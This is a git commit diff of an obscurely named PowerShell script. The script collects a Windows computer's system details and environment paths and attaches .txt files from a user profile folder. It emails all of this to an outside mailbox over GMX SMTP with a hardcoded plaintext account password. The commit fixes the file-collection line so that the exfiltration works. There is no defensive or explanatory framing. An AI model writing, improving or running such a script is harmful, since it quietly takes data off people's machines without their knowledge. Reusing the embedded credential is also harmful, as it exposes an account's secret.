78a4cec1e30dfeebd8dffe0e6c4581a9250cfd23
Noah Glatzl <noah.glatzl@gmail.com>
2023-03-01 18:03:17 +0100

    Update ezwirt398tz39tzwe.ps1

--- ezwirt398tz39tzwe.ps1
+++ ezwirt398tz39tzwe.ps1
@@ -4,6 +4,6 @@ $password = ConvertTo-SecureString 'Indianer@juhu@2004' -AsPlainText -Force
 $subject = 'OmgMessage ' + $env:COMPUTERNAME + ' ' + (Get-Date -Format "dd.MM.yyyy HH:mm:ss")
 $body = '<ul><li><b>Computername</b>: ' + $env:COMPUTERNAME + '</li><li><b>Appdata</b>: ' + $env:APPDATA + '</li><li><b>Homedrive</b>: ' + $env:HOMEDRIVE + $env:HOMEPATH + '</li><li><b>OS</b>: ' + $env:OS + '</li><li><b>Architecture</b>: ' + $env:PROCESSOR_IDENTIFIER + ', Revision ' + $env:PROCESSOR_REVISION + '</li><li><b>Number of Processors</b>: ' + $env:NUMBER_OF_PROCESSORS + '</li><li><b>Path Variable</b>: ' + $env:Path + '</li><li><b>Windows Direction</b>: ' + $env:windir + '</li></ul>'
 $credential = New-Object System.Management.Automation.PSCredential ($from, $password)
-[array]$attachments = Get-ChildItem $env:USERPROFILE + '\ooops' *.txt
+[array]$attachments = Get-ChildItem ($env:USERPROFILE + '\ooops') *.txt
 
 Send-MailMessage -To $to -From $from  -Subject $subject -Body $body -Credential $credential -Attachments $attachments.fullname -Priority High -DeliveryNotificationOption OnSuccess, OnFailure -SmtpServer 'mail.gmx.net' -Port 587 -UseSsl
